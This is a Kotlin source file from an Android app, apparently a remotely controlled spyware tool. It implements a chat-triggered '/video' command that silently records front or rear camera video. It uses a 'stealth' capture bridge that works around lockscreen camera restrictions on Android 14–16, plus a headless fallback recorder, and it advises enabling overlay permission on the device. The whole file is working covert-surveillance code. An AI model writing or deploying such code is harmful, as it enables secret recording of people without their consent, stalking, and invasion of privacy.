package com.izhaanintellect.pasa.commands

import android.content.Context
import android.util.Log
import com.izhaanintellect.pasa.camera.StealthCaptureBridge
import com.izhaanintellect.pasa.camera.StealthVideoManager
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.withTimeoutOrNull
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class VideoCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val stealthVideoManager: StealthVideoManager
) : Command {
    override val name = "/video"
    override val description = "Record a silent video using the device camera"
    override val usage = "/video [front|back] [seconds]"

    companion object {
        private const val TAG = "PASA_VideoCommand"
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        val useFront = args.firstOrNull()?.lowercase()?.let {
            it != "back" && it != "rear"
        } ?: true
        
        val durationSeconds = args.getOrNull(1)?.toIntOrNull()?.coerceIn(1, 60) ?: 15
        val cameraLabel = if (useFront) "front" else "rear"

        Log.i(TAG, "Recording video (camera=$cameraLabel, duration=${durationSeconds}s)")

        // 1. Primary path: StealthCaptureBridge (Activity in TOP state for Android 14-16 lockscreen)
        val captureResult = StealthCaptureBridge.recordVideo(
            context = context,
            useFront = useFront,
            durationSeconds = durationSeconds,
            timeoutMs = (durationSeconds + 15) * 1000L
        )

        val videoFile = captureResult.file
        if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
            return CommandResult(
                success = true,
                message = "🎥 Video recorded (${durationSeconds}s, $cameraLabel camera)",
                videoFile = videoFile
            )
        }

        Log.w(TAG, "StealthCaptureBridge video failed (${captureResult.error}), trying fallback")

        // 2. Secondary fallback: direct headless stealthVideoManager
        val fallbackFile = withTimeoutOrNull((durationSeconds + 10) * 1000L) {
            try {
                stealthVideoManager.recordVideo(useFront, durationSeconds)
            } catch (e: Exception) {
                Log.e(TAG, "Fallback video error", e)
                null
            }
        }

        return if (fallbackFile != null && fallbackFile.exists() && fallbackFile.length() > 0) {
            CommandResult(
                success = true,
                message = "🎥 Video recorded (${durationSeconds}s, $cameraLabel camera, fallback)",
                videoFile = fallbackFile
            )
        } else {
            val errorReason = captureResult.error ?: "Operation timed out or sensor restricted while device is locked."
            CommandResult(
                success = false,
                message = "❌ Failed to record video from $cameraLabel camera: $errorReason\n\n" +
                        "<i>Tip: If the device is locked on Android 16, ensure \"Display Over Other Apps\" is allowed in PASA App Info.</i>"
            )
        }
    }
}
